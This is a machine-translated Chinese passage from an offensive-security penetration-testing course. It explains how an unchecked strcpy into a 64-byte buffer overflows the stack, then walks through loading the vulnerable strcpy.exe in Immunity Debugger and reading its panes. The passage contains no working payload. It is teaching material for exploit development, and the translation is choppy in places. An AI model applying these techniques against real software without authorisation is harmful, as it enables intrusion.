<div style="position:absolute;top:35647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">299 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Local_variable</font></font></font></nobr></div>
<div style="position:absolute;top:35667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">300 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Scope_(computer_science)</font></font></font></nobr></div>
<div style="position:absolute;top:35687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">301 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Global_variable</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">351</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:35944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后程序继续复制（strcpy </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">302</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）给定命令行参数的内容</font></font></nobr></div>
<div style="position:absolute;top:35963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argv[1] </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">303</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 放入缓冲区字符数组。</font><font style="vertical-align: inherit;">注意 C 语言本身不支持</font></font></nobr></div>
<div style="position:absolute;top:35982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串作为数据类型。</font><font style="vertical-align: inherit;">在低级别，字符串是由空字符终止的字符序列</font></font></nobr></div>
<div style="position:absolute;top:36002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符 ('\0')，或者换句话说，一个一维字符数组。</font></font></nobr></div>
<div style="position:absolute;top:36035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，程序终止执行并返回零（标准成功退出代码）给</font></font></nobr></div>
<div style="position:absolute;top:36054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统。</font></font></nobr></div>
<div style="position:absolute;top:36087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们调用这个程序时，我们会将命令行参数传递给它。</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能</font></font></nobr></div>
<div style="position:absolute;top:36106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">借助两个参数</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">argv</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理这些参数</font><font style="vertical-align: inherit;">，它们代表</font></font></nobr></div>
<div style="position:absolute;top:36125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递给程序的参数数量（作为整数传递）和一个指针数组</font></font></nobr></div>
<div style="position:absolute;top:36145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别指向参数“字符串”本身。</font></font></nobr></div>
<div style="position:absolute;top:36177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果传递给 main 函数的参数是 64 个字符或更少，这个程序将作为</font></font></nobr></div>
<div style="position:absolute;top:36197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预期并将正常退出。</font><font style="vertical-align: inherit;">但是，由于没有检查输入的大小，如果</font></font></nobr></div>
<div style="position:absolute;top:36216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数较长，比如 80 字节，与目标缓冲区相邻的部分堆栈将被覆盖</font></font></nobr></div>
<div style="position:absolute;top:36236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剩下的 16 个字符，溢出数组边界。</font><font style="vertical-align: inherit;">这在图 182 中进行了说明。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36702;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 182：复制前后的堆栈布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:36733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种内存损坏的影响取决于多种因素，包括溢出的大小</font></font></nobr></div>
<div style="position:absolute;top:36752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及包含在该溢出中的数据。</font><font style="vertical-align: inherit;">要了解这在我们的场景中是如何工作的，我们可以应用</font></font></nobr></div>
<div style="position:absolute;top:36771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的应用程序的超大参数并观察效果。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:36855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">302 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(linux.die.net), https://linux.die.net/man/3/strcpy</font></font></font></nobr></div>
<div style="position:absolute;top:36875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">303 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GBdirect），https://publications.gbdirect.co.uk//c_book/chapter10/arguments_to_main.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">352</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:37132;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:37132;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">介绍免疫调试器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用称为调试器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">304</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的应用程序</font><font style="vertical-align: inherit;">来协助漏洞利用开发过程。</font><font style="vertical-align: inherit;">一种</font></font></nobr></div>
<div style="position:absolute;top:37189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器充当应用程序和 CPU 之间的代理，它允许我们停止</font></font></nobr></div>
<div style="position:absolute;top:37208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行流程随时检查寄存器的内容以及进程内存</font></font></nobr></div>
<div style="position:absolute;top:37228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">空间。</font><font style="vertical-align: inherit;">在通过调试器运行应用程序时，我们还可以执行程序集</font></font></nobr></div>
<div style="position:absolute;top:37247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一次一个指令，以更好地理解代码的详细流程。</font><font style="vertical-align: inherit;">虽然有</font></font></nobr></div>
<div style="position:absolute;top:37266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很多调试器可用，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">免疫调试器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">305</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其具有相对简单的</font></font></nobr></div>
<div style="position:absolute;top:37286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">界面并允许我们使用 Python 脚本来自动化任务。</font></font></nobr></div>
<div style="position:absolute;top:37319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以尝试使易受攻击的测试应用程序中的缓冲区溢出并使用 Immunity</font></font></nobr></div>
<div style="position:absolute;top:37338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器以更好地了解程序执行的每个阶段究竟发生了什么。</font></font></nobr></div>
<div style="position:absolute;top:37371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要启动 Immunity 并执行代码，我们将从桌面上的快捷方式启动它，然后</font></font></nobr></div>
<div style="position:absolute;top:37390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导航到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">File</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如图 183 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37858;left:369"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 183：免疫调试器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在对话框中，我们导航到 windows_buffer_overflow 目录并打开 strcpy.exe，它是</font></font></nobr></div>
<div style="position:absolute;top:37908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一节分析的源代码的编译版本。</font><font style="vertical-align: inherit;">在点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之前</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:37927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将向</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arguments</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段</font><font style="vertical-align: inherit;">添加 12 个“A”字符</font><font style="vertical-align: inherit;">，如图 184 所示。这 12 个字符</font></font></nobr></div>
<div style="position:absolute;top:37947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将作为程序的命令行参数，随后将被程序使用</font></font></nobr></div>
<div style="position:absolute;top:37966;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">strcpy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:38043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">304 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Debugger</font></font></font></nobr></div>
<div style="position:absolute;top:38063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">305 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（免疫，2019），https://www.immunityinc.com/products/debugger/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">353</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:38635;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 184：加载应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当调试器启动时，应用程序的执行流程将在</font><i><font style="vertical-align: inherit;">入口处</font></i><font style="vertical-align: inherit;">暂停</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:38685;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">点</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">306</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，在这个例子中，入口点与</font></font></nobr></div>
<div style="position:absolute;top:38704;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能。</font><font style="vertical-align: inherit;">这并不少见，因为入口点通常由编译器设置为</font></font></nobr></div>
<div style="position:absolute;top:38724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为帮助准备程序的执行而创建的代码。</font><font style="vertical-align: inherit;">除其他外，这种准备</font></font></nobr></div>
<div style="position:absolute;top:38743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">main</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能期望的</font><font style="vertical-align: inherit;">所有参数</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:38776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前，让我们更熟悉 Immunity 并练习导航</font></font></nobr></div>
<div style="position:absolute;top:38795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相关功能。</font><font style="vertical-align: inherit;">图 185 显示了主屏幕，它被分成四个窗口或窗格。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:39251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">306 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Entry_point</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:39379;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="34"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 34 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:39412;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:40489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:40489;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:40489;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">354</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:39942;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 185：免疫调试器布局</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:39974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左上角的窗口显示了构成应用程序的汇编指令。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:39993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以蓝色突出显示的指令 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SUB ESP,0C</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 是接下来要执行的汇编指令，它是</font></font></nobr></div>
<div style="position:absolute;top:40012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位于进程内存空间中的地址 0x004014E0： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:40567;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="35"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 35 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:40600;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:41677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:41677;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:41677;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">355</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41171;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 186：Immunity Debugger 组装窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">右上角的窗口（图 187）包含所有寄存器，包括我们最常用的两个</font></font></nobr></div>
<div style="position:absolute;top:41221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">兴趣：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ESP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EIP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">由于根据定义 EIP 指向要执行的下一条代码指令，</font></font></nobr></div>
<div style="position:absolute;top:41241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它设置为 0x004014E0，即汇编窗口中突出显示的指令（图 185）： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">356</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42237;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 187：Immunity Debugger 寄存器窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">右下方窗口（图 188）显示堆栈及其内容。</font><font style="vertical-align: inherit;">该视图包含四个</font></font></nobr></div>
<div style="position:absolute;top:42288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">列：内存地址、驻留在该地址的十六进制数据、</font></font></nobr></div>
<div style="position:absolute;top:42307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据，以及提供与特定堆栈相关的附加信息的动态评论</font></font></nobr></div>
<div style="position:absolute;top:42327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用时进入。</font><font style="vertical-align: inherit;">数据本身（第二列）显示为 32 位值，称为</font></font></nobr></div>
<div style="position:absolute;top:42346;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DWORD</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，显示为四个十六进制字节。</font><font style="vertical-align: inherit;">请注意，此窗格显示地址 0x0065FF84</font></font></nobr></div>
<div style="position:absolute;top:42365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在堆栈顶部，这实际上是寄存器窗口中 ESP 中存储的值（图</font></font></nobr></div>
<div style="position:absolute;top:42385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">187)： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">357</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43508;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 188：Immunity Debugger 堆栈窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后一个窗口位于左下方，显示任何给定地址的内存内容。</font><font style="vertical-align: inherit;">如同</font></font></nobr></div>
<div style="position:absolute;top:43559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈窗口，它显示了三列，包括内存地址和十六进制和 ASCII</font></font></nobr></div>
<div style="position:absolute;top:43578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据的表示。</font><font style="vertical-align: inherit;">顾名思义，此窗口在搜索</font></font></nobr></div>
<div style="position:absolute;top:43597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或分析进程内存空间中的特定值，它可以显示不同格式的数据</font></font></nobr></div>
<div style="position:absolute;top:43616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过右键单击窗口内容访问上下文菜单：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43888;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 189：Immunity Debugger 数据窗口</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43919;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:43919;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导航代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着调试器的不同窗口被映射出来，是时候浏览汇编代码了。</font></font></nobr></div>
<div style="position:absolute;top:43976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载时，应用程序执行被暂停，如下方的“Paused”字样所示 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">358</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调试器的右上角。</font><font style="vertical-align: inherit;">如上一节所述，调试器会自动</font></font></nobr></div>
<div style="position:absolute;top:44279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在程序入口点暂停。</font></font></nobr></div>
<div style="position:absolute;top:44312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Step into</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Debug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font><i><font style="vertical-align: inherit;">Step over</font></i><font style="vertical-align: inherit;">一次执行一条指令</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
